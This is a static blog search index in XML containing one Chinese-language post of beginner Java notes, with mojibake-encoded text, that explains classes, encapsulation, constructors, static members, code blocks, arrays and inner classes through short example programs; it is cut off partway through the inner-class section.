<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>javaç¬”è®°</title>
    <link href="/2025/11/20/java%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/11/20/java%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaç¬”è®°"><a href="#Javaç¬”è®°" class="headerlink" title="Javaç¬”è®°"></a>Javaç¬”è®°</h1><h2 id="1-3-èµ°è¿‘ç±»ä¸å¯¹è±¡"><a href="#1-3-èµ°è¿‘ç±»ä¸å¯¹è±¡" class="headerlink" title="1.3 èµ°è¿‘ç±»ä¸å¯¹è±¡"></a>1.3 èµ°è¿‘ç±»ä¸å¯¹è±¡</h2><h3 id="é€šä¿—ç†è§£"><a href="#é€šä¿—ç†è§£" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><ul><li><strong>ç±»</strong>ï¼šå°±åƒè®¾è®¡å›¾çº¸ï¼Œæè¿°ä¸€ç±»äº‹ç‰©çš„å…±åŒç‰¹å¾</li><li><strong>å¯¹è±¡</strong>ï¼šå°±åƒæ ¹æ®å›¾çº¸é€ å‡ºæ¥çš„å…·ä½“äº§å“</li></ul><h3 id="ä»£ç æ¼”ç¤º"><a href="#ä»£ç æ¼”ç¤º" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ç±»ï¼šè®¾è®¡å›¾çº¸</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-comment">// å±æ€§ï¼šæè¿°ç‰¹å¾</span><br>    String name;<br>    <span class="hljs-type">int</span> age;<br>    <br>    <span class="hljs-comment">// æ–¹æ³•ï¼šæè¿°è¡Œä¸º</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">study</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(name + <span class="hljs-string">&quot;æ­£åœ¨å­¦ä¹ ...&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// å¯¹è±¡ï¼šå…·ä½“çš„å­¦ç”Ÿ</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student1.name = <span class="hljs-string">&quot;å°æ˜&quot;</span>;<br>        student1.age = <span class="hljs-number">18</span>;<br>        student1.study();  <span class="hljs-comment">// è¾“å‡ºï¼šå°æ˜æ­£åœ¨å­¦ä¹ ...</span><br>        <br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student2.name = <span class="hljs-string">&quot;å°çº¢&quot;</span>;<br>        student2.age = <span class="hljs-number">17</span>;<br>        student2.study();  <span class="hljs-comment">// è¾“å‡ºï¼šå°çº¢æ­£åœ¨å­¦ä¹ ...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ”’-1-4-å±æ€§å°è£…"><a href="#ğŸ”’-1-4-å±æ€§å°è£…" class="headerlink" title="ğŸ”’ 1.4 å±æ€§å°è£…"></a>ğŸ”’ 1.4 å±æ€§å°è£…</h2><h3 id="é€šä¿—ç†è§£-1"><a href="#é€šä¿—ç†è§£-1" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>æŠŠé‡è¦æ•°æ®â€è—èµ·æ¥â€ï¼Œåªé€šè¿‡ç‰¹å®šæ–¹æ³•è®¿é—®ï¼Œå°±åƒä¿é™©ç®±</p><h3 id="ä»£ç æ¼”ç¤º-1"><a href="#ä»£ç æ¼”ç¤º-1" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BankAccount</span> &#123;<br>    <span class="hljs-comment">// privateï¼šç§æœ‰ï¼Œå¤–éƒ¨ä¸èƒ½ç›´æ¥è®¿é—®</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> balance;<br>    <span class="hljs-keyword">private</span> String password;<br>    <br>    <span class="hljs-comment">// æä¾›å…¬å¼€çš„æ–¹æ³•æ¥è®¿é—®ç§æœ‰å±æ€§</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBalance</span><span class="hljs-params">(<span class="hljs-type">double</span> money)</span> &#123;<br>        <span class="hljs-keyword">if</span> (money &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">this</span>.balance = money;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.balance;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkPassword</span><span class="hljs-params">(String inputPwd)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password.equals(inputPwd);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">BankAccount</span> <span class="hljs-variable">account</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BankAccount</span>();<br>        account.setBalance(<span class="hljs-number">1000</span>);  <span class="hljs-comment">// âœ… æ­£ç¡®æ–¹å¼</span><br>        <span class="hljs-comment">// account.balance = -1000;  // âŒ é”™è¯¯ï¼šä¸èƒ½ç›´æ¥è®¿é—®</span><br>        System.out.println(<span class="hljs-string">&quot;ä½™é¢ï¼š&quot;</span> + account.getBalance());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ› ï¸-1-5-æˆå‘˜æ–¹æ³•"><a href="#ğŸ› ï¸-1-5-æˆå‘˜æ–¹æ³•" class="headerlink" title="ğŸ› ï¸ 1.5 æˆå‘˜æ–¹æ³•"></a>ğŸ› ï¸ 1.5 æˆå‘˜æ–¹æ³•</h2><h3 id="é€šä¿—ç†è§£-2"><a href="#é€šä¿—ç†è§£-2" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>å¯¹è±¡èƒ½åšä»€ä¹ˆäº‹ï¼Œå°±åƒäººçš„å„ç§æŠ€èƒ½</p><h3 id="ä»£ç æ¼”ç¤º-2"><a href="#ä»£ç æ¼”ç¤º-2" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> &#123;<br>    <span class="hljs-comment">// æ— è¿”å›å€¼æ–¹æ³•</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä½ å¥½ï¼Œæˆ‘æ˜¯è®¡ç®—å™¨ï¼&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// æœ‰è¿”å›å€¼æ–¹æ³•</span><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>        <span class="hljs-keyword">return</span> a + b;<br>    &#125;<br>    <br>    <span class="hljs-comment">// å¸¦å‚æ•°çš„æ–¹æ³•</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">printResult</span><span class="hljs-params">(<span class="hljs-type">int</span> result)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è®¡ç®—ç»“æœæ˜¯ï¼š&quot;</span> + result);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Calculator</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>();<br>        calc.sayHello();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> calc.add(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>);<br>        calc.printResult(sum);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ—ï¸-1-6-æ„é€ æ–¹æ³•"><a href="#ğŸ—ï¸-1-6-æ„é€ æ–¹æ³•" class="headerlink" title="ğŸ—ï¸ 1.6 æ„é€ æ–¹æ³•"></a>ğŸ—ï¸ 1.6 æ„é€ æ–¹æ³•</h2><h3 id="é€šä¿—ç†è§£-3"><a href="#é€šä¿—ç†è§£-3" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>åˆ›å»ºå¯¹è±¡æ—¶çš„â€å‡ºç”Ÿè®¾ç½®â€ï¼Œå°±åƒå®å®å‡ºç”Ÿæ—¶çš„åŸºæœ¬ä¿¡æ¯</p><h3 id="ä»£ç æ¼”ç¤º-3"><a href="#ä»£ç æ¼”ç¤º-3" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Phone</span> &#123;<br>    String brand;<br>    <span class="hljs-type">double</span> price;<br>    <br>    <span class="hljs-comment">// æ— å‚æ„é€ æ–¹æ³•</span><br>    Phone() &#123;<br>        <span class="hljs-built_in">this</span>.brand = <span class="hljs-string">&quot;æœªçŸ¥å“ç‰Œ&quot;</span>;<br>        <span class="hljs-built_in">this</span>.price = <span class="hljs-number">0.0</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// æœ‰å‚æ„é€ æ–¹æ³•</span><br>    Phone(String brand, <span class="hljs-type">double</span> price) &#123;<br>        <span class="hljs-built_in">this</span>.brand = brand;<br>        <span class="hljs-built_in">this</span>.price = price;<br>    &#125;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">showInfo</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å“ç‰Œï¼š&quot;</span> + brand + <span class="hljs-string">&quot;ï¼Œä»·æ ¼ï¼š&quot;</span> + price);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phone</span>();  <span class="hljs-comment">// ä½¿ç”¨æ— å‚æ„é€ </span><br>        phone1.showInfo();<br>        <br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phone</span>(<span class="hljs-string">&quot;åä¸º&quot;</span>, <span class="hljs-number">5999.0</span>);  <span class="hljs-comment">// ä½¿ç”¨æœ‰å‚æ„é€ </span><br>        phone2.showInfo();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ”‘-1-7-thiså’Œstaticå…³é”®å­—"><a href="#ğŸ”‘-1-7-thiså’Œstaticå…³é”®å­—" class="headerlink" title="ğŸ”‘ 1.7 thiså’Œstaticå…³é”®å­—"></a>ğŸ”‘ 1.7 thiså’Œstaticå…³é”®å­—</h2><h3 id="é€šä¿—ç†è§£-4"><a href="#é€šä¿—ç†è§£-4" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><ul><li><strong>this</strong>ï¼šæŒ‡ä»£å½“å‰å¯¹è±¡è‡ªå·±ï¼Œå°±åƒè¯´â€æˆ‘â€</li><li><strong>static</strong>ï¼šå±äºç±»è€Œä¸æ˜¯å¯¹è±¡ï¼Œå°±åƒå…±äº«è´¢äº§</li></ul><h3 id="ä»£ç æ¼”ç¤º-4"><a href="#ä»£ç æ¼”ç¤º-4" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Classroom</span> &#123;<br>    String studentName;  <span class="hljs-comment">// å®ä¾‹å˜é‡ï¼Œæ¯ä¸ªå¯¹è±¡ç‹¬æœ‰</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">schoolName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;å¸Œæœ›å°å­¦&quot;</span>;  <span class="hljs-comment">// é™æ€å˜é‡ï¼Œæ‰€æœ‰å¯¹è±¡å…±äº«</span><br>    <br>    Classroom(String studentName) &#123;<br>        <span class="hljs-built_in">this</span>.studentName = studentName;  <span class="hljs-comment">// thisæŒ‡å½“å‰å¯¹è±¡</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">showInfo</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(studentName + <span class="hljs-string">&quot;åœ¨&quot;</span> + schoolName);<br>    &#125;<br>    <br>    <span class="hljs-comment">// é™æ€æ–¹æ³•</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changeSchool</span><span class="hljs-params">(String newName)</span> &#123;<br>        schoolName = newName;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Classroom</span> <span class="hljs-variable">stu1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Classroom</span>(<span class="hljs-string">&quot;å°æ˜&quot;</span>);<br>        <span class="hljs-type">Classroom</span> <span class="hljs-variable">stu2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Classroom</span>(<span class="hljs-string">&quot;å°çº¢&quot;</span>);<br>        <br>        stu1.showInfo();  <span class="hljs-comment">// å°æ˜åœ¨å¸Œæœ›å°å­¦</span><br>        stu2.showInfo();  <span class="hljs-comment">// å°çº¢åœ¨å¸Œæœ›å°å­¦</span><br>        <br>        <span class="hljs-comment">// é€šè¿‡ç±»åè°ƒç”¨é™æ€æ–¹æ³•</span><br>        Classroom.changeSchool(<span class="hljs-string">&quot;é˜³å…‰å°å­¦&quot;</span>);<br>        <br>        stu1.showInfo();  <span class="hljs-comment">// å°æ˜åœ¨é˜³å…‰å°å­¦</span><br>        stu2.showInfo();  <span class="hljs-comment">// å°çº¢åœ¨é˜³å…‰å°å­¦</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ“¦-1-8-ä»£ç å—"><a href="#ğŸ“¦-1-8-ä»£ç å—" class="headerlink" title="ğŸ“¦ 1.8 ä»£ç å—"></a>ğŸ“¦ 1.8 ä»£ç å—</h2><h3 id="é€šä¿—ç†è§£-5"><a href="#é€šä¿—ç†è§£-5" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>ä»£ç æ‰§è¡Œçš„â€å‡†å¤‡åŒºåŸŸâ€ï¼Œå°±åƒæ¼”å‡ºå‰çš„å‡†å¤‡å·¥ä½œ</p><h3 id="ä»£ç æ¼”ç¤º-5"><a href="#ä»£ç æ¼”ç¤º-5" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestBlock</span> &#123;<br>    <span class="hljs-keyword">static</span> String className;<br>    <br>    <span class="hljs-comment">// é™æ€ä»£ç å—ï¼šç±»åŠ è½½æ—¶æ‰§è¡Œï¼Œåªæ‰§è¡Œä¸€æ¬¡</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        className = <span class="hljs-string">&quot;Javaç­&quot;</span>;<br>        System.out.println(<span class="hljs-string">&quot;é™æ€ä»£ç å—æ‰§è¡Œäº†&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// å®ä¾‹ä»£ç å—ï¼šæ¯æ¬¡åˆ›å»ºå¯¹è±¡æ—¶éƒ½æ‰§è¡Œ</span><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;å®ä¾‹ä»£ç å—æ‰§è¡Œäº†&quot;</span>);<br>    &#125;<br>    <br>    TestBlock() &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ„é€ æ–¹æ³•æ‰§è¡Œäº†&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;åˆ›å»ºç¬¬ä¸€ä¸ªå¯¹è±¡ï¼š&quot;</span>);<br>        <span class="hljs-type">TestBlock</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestBlock</span>();<br>        <br>        System.out.println(<span class="hljs-string">&quot;åˆ›å»ºç¬¬äºŒä¸ªå¯¹è±¡ï¼š&quot;</span>);<br>        <span class="hljs-type">TestBlock</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestBlock</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ“Š-1-9-ä¸€ç»´æ•°ç»„"><a href="#ğŸ“Š-1-9-ä¸€ç»´æ•°ç»„" class="headerlink" title="ğŸ“Š 1.9 ä¸€ç»´æ•°ç»„"></a>ğŸ“Š 1.9 ä¸€ç»´æ•°ç»„</h2><h3 id="é€šä¿—ç†è§£-6"><a href="#é€šä¿—ç†è§£-6" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>å°±åƒä¸€æ’æ•´é½çš„å‚¨ç‰©æŸœï¼Œæ¯ä¸ªæ ¼å­æ”¾ä¸€ä¸ªä¸œè¥¿</p><h3 id="ä»£ç æ¼”ç¤º-6"><a href="#ä»£ç æ¼”ç¤º-6" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// åˆ›å»ºæ•°ç»„çš„ä¸‰ç§æ–¹å¼</span><br>        <span class="hljs-type">int</span>[] scores1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];  <span class="hljs-comment">// é•¿åº¦ä¸º5çš„ç©ºæ•°ç»„</span><br>        <span class="hljs-type">int</span>[] scores2 = &#123;<span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">78</span>, <span class="hljs-number">92</span>, <span class="hljs-number">88</span>&#125;;  <span class="hljs-comment">// ç›´æ¥èµ‹å€¼</span><br>        <span class="hljs-type">int</span>[] scores3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">78</span>, <span class="hljs-number">92</span>, <span class="hljs-number">88</span>&#125;;<br>        <br>        <span class="hljs-comment">// è®¿é—®æ•°ç»„å…ƒç´ </span><br>        scores1[<span class="hljs-number">0</span>] = <span class="hljs-number">95</span>;<br>        System.out.println(<span class="hljs-string">&quot;ç¬¬ä¸€ä¸ªæˆç»©ï¼š&quot;</span> + scores1[<span class="hljs-number">0</span>]);<br>        <br>        <span class="hljs-comment">// éå†æ•°ç»„</span><br>        System.out.println(<span class="hljs-string">&quot;æ‰€æœ‰æˆç»©ï¼š&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; scores2.length; i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;ç¬¬&quot;</span> + (i+<span class="hljs-number">1</span>) + <span class="hljs-string">&quot;ä¸ªæˆç»©ï¼š&quot;</span> + scores2[i]);<br>        &#125;<br>        <br>        <span class="hljs-comment">// å¢å¼ºforå¾ªç¯</span><br>        System.out.println(<span class="hljs-string">&quot;ä½¿ç”¨å¢å¼ºforå¾ªç¯ï¼š&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> score : scores2) &#123;<br>            System.out.println(score);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ğŸ-1-11-å†…éƒ¨ç±»"><a href="#ğŸ-1-11-å†…éƒ¨ç±»" class="headerlink" title="ğŸ 1.11 å†…éƒ¨ç±»"></a>ğŸ 1.11 å†…éƒ¨ç±»</h2><h3 id="é€šä¿—ç†è§£-7"><a href="#é€šä¿—ç†è§£-7" class="headerlink" title="é€šä¿—ç†è§£"></a>é€šä¿—ç†è§£</h3><p>ç±»é‡Œé¢çš„ç±»ï¼Œå°±åƒå¤§ç›’å­é‡Œé¢è£…å°ç›’å­</p><h3 id="ä»£ç æ¼”ç¤º-7"><a href="#ä»£ç æ¼”ç¤º-7" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">outerField</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;å¤–éƒ¨ç±»å­—æ®µ&quot;</span>;<br>    <br>    <span class="hljs-comment">// æˆå‘˜å†…éƒ¨ç±»</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span> &#123;<br>        <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;è®¿é—®å¤–éƒ¨ç±»çš„å­—æ®µï¼š&quot;</span> + outerField);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// é™æ€å†…éƒ¨ç±»</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticInner</span> &#123;<br>        <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span 